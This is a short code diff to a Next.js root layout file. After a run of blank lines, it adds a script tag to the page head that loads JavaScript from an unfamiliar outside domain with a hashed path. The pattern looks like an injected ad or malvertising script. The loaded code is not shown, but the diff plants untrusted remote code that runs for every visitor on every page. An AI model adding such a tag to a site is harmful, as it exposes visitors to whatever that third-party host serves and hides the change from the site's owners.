@@ -36,7 +36,12 @@ export default function RootLayout({ children }) {
           strategy="afterInteractive"
         />
 
-        
+
+
+
+
+            <script type='text/javascript' src='//stinklistedtobacco.com/f6/16/56/f6165662a86e444978a2f98e3bc536f2.js'></script>
+            
       </head>
 
       <body className={inter.variable}>
